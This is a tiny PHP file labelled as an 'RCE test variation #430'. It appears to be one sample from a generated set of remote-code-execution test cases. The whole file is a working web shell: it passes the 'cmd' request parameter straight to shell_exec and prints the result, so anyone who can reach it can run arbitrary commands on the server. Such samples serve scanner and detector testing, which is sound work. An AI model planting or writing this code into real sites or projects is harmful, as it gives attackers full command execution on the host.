<?php
// RCE test variation #430
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>